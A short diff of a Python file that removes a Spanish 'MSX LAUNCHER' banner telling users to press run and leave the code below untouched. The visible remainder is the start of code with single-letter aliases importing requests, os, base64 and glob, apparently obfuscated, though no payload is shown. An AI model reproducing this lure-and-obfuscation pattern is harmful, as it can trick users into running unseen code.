@@ -1,45 +1,4 @@
-
-
-
-
-
-# ================
-# MSX LAUNCHER 1.0
-# ================
-# 1. Instala la extensión de Python
-# 2. Haz click al botón de arriba a la derecha (►)
-
-# Si no aparece el botón, reinicia la página o cambia de navegador.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# =================================================
-# No toques nada de aquí para abajo, puedes dañarlo
-# =================================================
+#pito
 A='server.py'
 E=print
 import requests as F,os as B,base64 as D,glob as C,time
